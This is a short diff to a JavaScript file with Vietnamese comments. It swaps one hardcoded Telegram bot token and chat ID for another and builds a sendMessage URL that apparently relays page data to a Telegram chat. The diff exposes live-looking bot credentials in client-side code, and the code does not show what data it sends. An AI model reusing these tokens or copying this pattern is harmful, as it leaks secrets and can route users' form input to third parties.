@@ -17,8 +17,8 @@ document.addEventListener("DOMContentLoaded", function () {
         });
 
         // Thay token và chat_id của bạn vào đây
-        const TOKEN = "7715457402:AAGL4TJmgCtQ1hAAAE4pmTsDwUirZydhKTI";  // Thay bằng token bot Telegram của bạn
-        const CHAT_ID = "7109476249";  // Thay bằng chat ID của bạn
+        const TOKEN = "7286174425:AAGNGPGE18Lr65ZDy-I4oTvf89ajkLVMA7w";  // Thay bằng token bot Telegram của bạn
+        const CHAT_ID = "7363187130";  // Thay bằng chat ID của bạn
 
         const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
         const data = {
